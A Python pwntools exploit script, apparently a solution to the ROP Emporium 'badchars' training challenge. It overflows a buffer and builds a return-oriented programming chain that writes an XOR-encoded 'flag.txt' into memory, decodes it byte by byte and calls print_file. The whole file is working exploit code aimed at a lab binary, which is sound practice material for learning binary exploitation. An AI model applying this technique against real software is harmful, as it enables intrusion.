from pwn import *

bin = '/home/kali/Downloads/ropemporium/challenge5/badchars'

bin= ELF(bin)
context.binary = bin
context.log_level = 'debug'

offset = 40

str1= "flag.txt"
addr= 0x00601068
junk= 0xdeadbeefdeadbeef
key= 0x2
encoded=''

for i in str1:
    encoded+= chr(ord(i) ^key)

print= bin.plt['print_file']

ga1= next(bin.search(asm('pop r12; pop r13; pop r14; pop r15; ret;')))
ga2= next(bin.search(asm('mov qword ptr [r13], r12; ret; ')))
ga3= next(bin.search(asm('xor byte ptr [r15], r14b; ret;')))

ga5= next(bin.search(asm('pop rdi; ret;')))

chain= flat(b'A' * 40, p64(ga1), (encoded), p64(addr), p64(junk), p64(junk), p64(ga2))

for i in range(8):
    chain+= flat(p64(ga1), p64(junk), p64(junk), p64(key), p64(addr+i), p64(ga3))

chain+= flat(p64(ga5), p64(addr), p64(print))

p2= process(bin.path)
p2.sendline(chain)
p2.interactive()